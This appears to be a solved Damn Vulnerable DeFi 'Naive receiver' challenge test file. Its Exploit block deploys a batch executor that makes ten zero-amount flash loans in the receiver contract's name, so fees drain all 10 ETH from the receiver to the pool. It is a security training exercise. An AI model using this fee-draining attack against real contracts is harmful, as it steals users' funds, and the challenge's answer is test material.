const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const LenderPool = contract.fromArtifact('NaiveReceiverLenderPool');
const FlashLoanReceiver = contract.fromArtifact('FlashLoanReceiver');
const DamnBatchExecutor = contract.fromArtifact('DamnBatchExecutor');

const { expect } = require('chai');

describe('[Challenge] Naive receiver', function() {
	const [ deployer, user, attacker, ...otherAccounts ] = accounts;

	// Pool has 1000 ETH in balance
	const ETHER_IN_POOL = ether('1000');

	// Receiver has 10 ETH in balance
	const ETHER_IN_RECEIVER = ether('10');

	before(async function() {
		/** SETUP - NO NEED TO CHANGE ANYTHING HERE */
		//Flashloan pool.
		this.pool = await LenderPool.new({ from: deployer });
		//Send ETH To pool.
		await web3.eth.sendTransaction({ from: deployer, to: this.pool.address, value: ETHER_IN_POOL });
		//check if pool contains that amount of ETH.
		expect(await balance.current(this.pool.address)).to.be.bignumber.equal(ETHER_IN_POOL);
		//check pool fees is 1 ether.
		expect(await this.pool.fixedFee({ from: deployer })).to.be.bignumber.equal(ether('1'));
		// deploy flashloan receiver.
		this.receiver = await FlashLoanReceiver.new(this.pool.address, { from: user });
		// send ETH to receiver contract.
		await web3.eth.sendTransaction({ from: user, to: this.receiver.address, value: ETHER_IN_RECEIVER });
		//check pool flashloan receiver have ETH.
		expect(await balance.current(this.receiver.address)).to.be.bignumber.equal(ETHER_IN_RECEIVER);
	});

	it('Exploit', async function() {
		/** YOUR EXPLOIT GOES HERE */
		//The fill() method fills the specified elements in an array with a static value.
		// Call Flashloan with 0 amount with receiver address,
		await DamnBatchExecutor.new(
			Array(10).fill(this.pool.address),
			Array(10).fill(0),
			Array(10).fill(this.pool.contract.methods.flashLoan(this.receiver.address, 0).encodeABI()),
			{ from: attacker }
		);
	});

	after(async function() {
		// Original condition - Pool has 1000 ETH in balance , Receiver has 10 ETH in balance
		/** SUCCESS CONDITIONS */
		// Pool has 1010 ETH in balance , Receiver has 0 ETH in balance

		// All ETH has been drained from the receiver
		expect(await balance.current(this.receiver.address)).to.be.bignumber.equal('0');
		// Flashloan pool have all the ETH.
		expect(await balance.current(this.pool.address)).to.be.bignumber.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
	});
});
